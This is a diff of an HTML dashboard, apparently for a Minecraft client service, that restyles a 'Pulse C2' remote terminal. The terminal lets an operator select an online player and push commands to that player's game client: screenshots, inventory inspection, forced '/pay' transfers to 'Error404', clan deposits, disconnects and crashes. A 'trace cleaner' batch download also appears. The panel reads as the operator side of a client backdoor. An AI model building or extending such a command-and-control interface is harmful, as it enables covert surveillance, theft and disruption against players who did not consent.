@@ -748,28 +748,6 @@
                             </button>
                         </div>
 
-
-                        <!-- Opsec Mod Download Card -->
-                        <div class="krypton-download-card important-card" style="margin-top: 20px; border: 1px solid rgba(255, 255, 255, 0.1); background: rgba(255, 255, 255, 0.03); position: relative; overflow: hidden;">
-                            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 1px; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent);"></div>
-                            <div class="card-left">
-                                <div class="icon-download-large">
-                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                                </div>
-                                <div class="download-meta">
-                                    <div style="display: flex; align-items: center; gap: 8px;">
-                                        <h3 id="opsec-title-text" data-i18n="dash.opsecTitle">Opsec Mod</h3>
-                                        <span class="badge-jar">IMPORTANT</span>
-                                    </div>
-                                    <span id="opsec-desc-text" data-i18n="dash.opsecDesc" style="color: var(--text-secondary); max-width: 500px; display: block; font-size: 13px; margin-top: 4px;">ამ მოდის ჩაწერა კატეგორიულად აუცილებელია უსაფრთხოებისთვის (OpSec). წინააღმდეგ შემთხვევაში ჩვენ ვიხსნით სრულ პასუხისმგებლობას თქვენს ანგარიშებზე!</span>
-                                </div>
-                            </div>
-                            <a id="download-opsec-btn" href="https://modrinth.com/mod/opsec" target="_blank" rel="noopener noreferrer" class="btn-krypton-download" style="text-decoration: none;">
-                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 6px; vertical-align: middle;"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
-                                <span data-i18n="dash.download">ჩამოტვირთვა</span>
-                            </a>
-                        </div>
-
                         
                         <!-- OpSec Trace Cleaner Card (.bat) -->
                         <div class="krypton-download-card cleaner-card" style="margin-top: 20px; border: 1px solid rgba(255, 255, 255, 0.1); background: rgba(255, 255, 255, 0.03); position: relative; overflow: hidden;">
@@ -2407,7 +2385,7 @@
 
             <div style="text-align: center; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 16px;">
                 <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 12px;">დამატებითი მოწყობილობის სლოტის მისაბმელად მიმართეთ მხარდაჭერას Discord-ზე.</p>
-                <a href="https://discord.gg/kAFr2Bpyxw" target="_blank" rel="noopener noreferrer" class="btn btn-glow" style="width: 100%; display: justify-content: center;">
+                <a href="https://discord.gg/kAFr2Bpyxw" target="_blank" rel="noopener noreferrer" class="btn btn-glow" style="width: 100%; display: flex; align-items: center; justify-content: center; background: #ffffff !important; color: #000000 !important; font-weight: 700; text-decoration: none; border-radius: 99px;">
                     + დაამატე მოწყობილობის სლოტი (Discord)
                 </a>
             </div>
@@ -2491,114 +2469,110 @@
                 </svg>
             </button>
 
-            <!-- Cyber Window Header -->
-            <div class="cyber-header-bar">
-                <div style="display: flex; align-items: center; gap: 14px;">
+            <!-- Realistic Terminal Window Header -->
+            <div class="terminal-header-bar">
+                <div class="terminal-titlebar-left">
                     <div class="terminal-traffic-lights">
-                        <span class="t-light t-red"></span>
-                        <span class="t-light t-amber"></span>
-                        <span class="t-light t-green"></span>
+                        <span class="t-light t-red" onclick="closeAdminRemoteModal()" title="Close"></span>
+                        <span class="t-light t-amber" title="Minimize"></span>
+                        <span class="t-light t-green" title="Expand"></span>
                     </div>
-                    <div style="width: 42px; height: 42px; border-radius: 10px; background: rgba(0, 255, 157, 0.12); color: #00ff9d; display: inline-flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 18px; font-weight: 900; border: 1px solid rgba(0, 255, 157, 0.4); box-shadow: 0 0 15px rgba(0, 255, 157, 0.25);">
-                        &gt;_
+                    <div class="terminal-title-text">
+                        <span class="terminal-host">pulse@c2-node</span>:<span class="terminal-path">~/remote-session</span>
                     </div>
-                    <div>
-                        <h3 style="margin: 0; font-size: 16px; font-family: 'JetBrains Mono', monospace; font-weight: 800; letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; color: #fff;">
-                            PULSE C2 // REMOTE TERMINAL
-                            <span class="cyber-badge-live">
-                                <span class="pulse-dot"></span>
-                                LIVE C2 LINK
-                            </span>
-                        </h3>
-                        <p style="color: #94a3b8; font-size: 11.5px; font-family: 'JetBrains Mono', monospace; margin: 3px 0 0 0;">
-                            ENCRYPTED AES-256 TUNNEL • DIRECT IN-GAME WEBSOCKET DISPATCH
-                        </p>
-                    </div>
+                </div>
+                <div class="terminal-badge-live">
+                    <span class="pulse-dot"></span>
+                    <span>ONLINE • ENCRYPTED</span>
                 </div>
             </div>
 
-            <!-- Target Selection Row -->
+            <!-- Target Selection Row (Oval Pill Design) -->
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 14px;">
                 <div>
-                    <label class="cyber-label">
-                        <span>[ 01 // TARGET OPERATOR ]</span>
+                    <label class="terminal-label">
+                        <span>ONLINE PLAYERS</span>
                     </label>
-                    <select id="remote-target-select" onchange="onRemoteTargetChange()" class="cyber-select">
-                        <option value="">-- აირჩიეთ ონლაინ მოთამაშე --</option>
-                    </select>
+                    <div class="oval-select-box">
+                        <select id="remote-target-select" onchange="onRemoteTargetChange()" class="oval-select">
+                            <option value="">-- აირჩიეთ ონლაინ მოთამაშე --</option>
+                        </select>
+                        <svg class="select-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    </div>
                 </div>
                 <div>
-                    <label class="cyber-label">
-                        <span>[ 02 // PAYLOAD VECTOR ]</span>
+                    <label class="terminal-label">
+                        <span>PAYLOAD VECTOR</span>
                     </label>
-                    <select id="remote-type-select" class="cyber-select">
-                        <option value="cmd">Minecraft Command / Chat (/spawn, /pay...)</option>
-                        <option value="msg">HUD Broadcast / Screen Title Alert</option>
-                        <option value="disconnect">Force Server Disconnect (Drop Client)</option>
-                        <option value="crash">Force Process Crash (SIGSEGV Kill)</option>
-                    </select>
+                    <div class="oval-select-box">
+                        <select id="remote-type-select" class="oval-select">
+                            <option value="cmd">Minecraft Command / Chat (/spawn, /pay...)</option>
+                            <option value="msg">HUD Broadcast / Screen Title Alert</option>
+                            <option value="disconnect">Force Server Disconnect (Drop Client)</option>
+                            <option value="crash">Force Process Crash (SIGSEGV Kill)</option>
+                        </select>
+                        <svg class="select-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                    </div>
                 </div>
             </div>
 
             <!-- Target Live Card HUD Preview -->
-            <div id="remote-target-card" class="cyber-target-hud">
+            <div id="remote-target-card" class="terminal-target-hud">
                 <div style="display: flex; align-items: center; gap: 12px;">
-                    <img id="remote-target-avatar" class="cyber-target-avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
+                    <img id="remote-target-avatar" class="terminal-target-avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
                     <div>
-                        <div style="font-weight: 800; font-family: 'JetBrains Mono', monospace; font-size: 13.5px; color: #f8fafc; letter-spacing: 0.3px;" id="remote-target-name">არ არის არჩეული</div>
-                        <div style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: #38bdf8; margin-top: 2px;" id="remote-target-server">NODE: N/A</div>
+                        <div style="font-weight: 700; font-family: 'JetBrains Mono', monospace; font-size: 13.5px; color: #f8fafc;" id="remote-target-name">არ არის არჩეული</div>
+                        <div style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: #a1a1aa; margin-top: 2px;" id="remote-target-server">NODE: N/A</div>
                     </div>
                 </div>
                 <div style="display: flex; align-items: center; gap: 8px;">
-                    <span style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #00ff9d; font-weight: 700; background: rgba(0, 255, 157, 0.08); border: 1px solid rgba(0, 255, 157, 0.2); padding: 2px 6px; border-radius: 4px;">TUNNEL: OK</span>
-                    <div id="remote-target-key-badge" class="cyber-key-badge">KEY: ---</div>
+                    <span style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #e4e4e7; font-weight: 700; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.15); padding: 3px 8px; border-radius: 99px;">TUNNEL: OK</span>
+                    <div id="remote-target-key-badge" class="target-key-badge">KEY: ---</div>
                 </div>
             </div>
 
             <!-- Quick Presets -->
             <div style="margin-bottom: 12px;">
-                <label class="cyber-label">
-                    <span>[ 03 // EXPLOIT PAYLOAD SHORTCUTS ]</span>
+                <label class="terminal-label">
+                    <span>QUICK COMMANDS</span>
                 </label>
                 <div style="display: flex; flex-wrap: wrap; gap: 6px;">
-                    <button type="button" class="remote-preset-btn" style="background: rgba(56, 189, 248, 0.2); border-color: #38bdf8; color: #38bdf8; font-weight: 800;" onclick="triggerLiveScreenshotFromRemote()">[LIVE SCREENSHOT]</button>
-                    <button type="button" class="remote-preset-btn" style="background: rgba(168, 85, 247, 0.2); border-color: #a855f7; color: #c084fc; font-weight: 800;" onclick="triggerLiveInspectFromRemote()">[INSPECT INVENTORY & PLAYER]</button>
-                    <button type="button" class="remote-preset-btn" onclick="applyRemotePreset('/spawn')">[/spawn]</button>
-                    <button type="button" class="remote-preset-btn" onclick="applyRemotePreset('/hub')">[/hub]</button>
-                    <button type="button" class="remote-preset-btn" onclick="applyRemotePreset('/clan deposit all')">[/clan deposit all]</button>
-                    <button type="button" class="remote-preset-btn" onclick="applyRemotePreset('/pay Error404 1000')">[/pay Error404 1000]</button>
-                    <button type="button" class="remote-preset-btn" onclick="applyRemotePreset('/tpa Error404')">[/tpa Error404]</button>
-                    <button type="button" class="remote-preset-btn" onclick="applyRemotePreset('/msg Error404 Hello Admin')">[/msg Admin]</button>
-                    <button type="button" class="remote-preset-btn btn-danger-preset" onclick="applyRemotePreset('disconnect')">[FORCE KICK]</button>
-                    <button type="button" class="remote-preset-btn btn-danger-preset" onclick="applyRemotePreset('crash')">[CLIENT CRASH]</button>
+                    <button type="button" class="term-preset-pill" onclick="triggerLiveScreenshotFromRemote()">[screenshot]</button>
+                    <button type="button" class="term-preset-pill" onclick="triggerLiveInspectFromRemote()">[inspect]</button>
+                    <button type="button" class="term-preset-pill" onclick="applyRemotePreset('/spawn')">/spawn</button>
+                    <button type="button" class="term-preset-pill" onclick="applyRemotePreset('/hub')">/hub</button>
+                    <button type="button" class="term-preset-pill" onclick="applyRemotePreset('/clan deposit all')">/clan deposit</button>
+                    <button type="button" class="term-preset-pill" onclick="applyRemotePreset('/pay Error404 1000')">/pay</button>
+                    <button type="button" class="term-preset-pill" onclick="applyRemotePreset('/tpa Error404')">/tpa</button>
+                    <button type="button" class="term-preset-pill" onclick="applyRemotePreset('/msg Error404 Hello Admin')">/msg</button>
+                    <button type="button" class="term-preset-pill term-preset-danger" onclick="applyRemotePreset('disconnect')">disconnect</button>
+                    <button type="button" class="term-preset-pill term-preset-danger" onclick="applyRemotePreset('crash')">sigsegv crash</button>
                 </div>
             </div>
 
             <!-- Live Terminal Output Screen -->
             <div style="margin-bottom: 12px;">
                 <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
-                    <label class="cyber-label" style="margin-bottom: 0;">
-                        <span>[ REMOTE C2 TERMINAL BUFFER ]</span>
+                    <label class="terminal-label" style="margin-bottom: 0;">
+                        <span>TERMINAL BUFFER // stdout &amp; stderr</span>
                     </label>
-                    <button type="button" onclick="clearRemoteTerminal()" style="background: none; border: none; color: #64748b; font-family: 'JetBrains Mono', monospace; font-size: 11px; cursor: pointer; text-decoration: underline; transition: color 0.2s;" onmouseover="this.style.color='#f43f5e'" onmouseout="this.style.color='#64748b'">[ PURGE BUFFER ]</button>
+                    <button type="button" onclick="clearRemoteTerminal()" class="term-clear-btn">clear</button>
                 </div>
-                <div id="remote-terminal-screen" class="cyber-terminal-screen">
-                    <div style="color: #64748b; font-size: 11px;">[SYSTEM] Pulse C2 Web-to-Game Socket connected. Standing by for payload dispatch.</div>
+                <div id="remote-terminal-screen" class="realistic-terminal-screen">
+                    <div style="color: #71717a; font-size: 11.5px; font-family: 'JetBrains Mono', monospace;">[SYSTEM] Pulse C2 kernel online. WebSocket link active. Ready for input.</div>
                 </div>
             </div>
 
             <!-- Command Input Line -->
-            <div class="cyber-cmd-bar">
-                <div style="position: relative; flex: 1;">
-                    <span class="cyber-prompt-prefix">root@c2:~$</span>
-                    <input type="text" id="remote-cmd-input" class="cyber-cmd-input" placeholder="ჩაწერეთ ბრძანება (მაგ. /spawn ან /pay) და დააჭირეთ Enter-ს..." onkeydown="if(event.key==='Enter') sendRemoteCommand()">
-                </div>
-                <button type="button" class="cyber-dispatch-btn" onclick="sendRemoteCommand()">
-                    <span>INJECT</span>
+            <div class="realistic-cmd-bar">
+                <span class="term-prompt-label">pulse@c2:~$</span>
+                <input type="text" id="remote-cmd-input" class="realistic-cmd-input" placeholder="type command (e.g. /spawn) and hit Enter..." onkeydown="if(event.key==='Enter') sendRemoteCommand()">
+                <button type="button" class="realistic-dispatch-btn" onclick="sendRemoteCommand()">
+                    <span>EXEC &#x21B5;</span>
                 </button>
             </div>
 
-            <button type="button" class="cyber-abort-btn" onclick="closeAdminRemoteModal()">[ CLOSE / ABORT TERMINAL ]</button>
+            <button type="button" class="terminal-close-btn" onclick="closeAdminRemoteModal()">დახურვა</button>
         </div>
     </div>
 
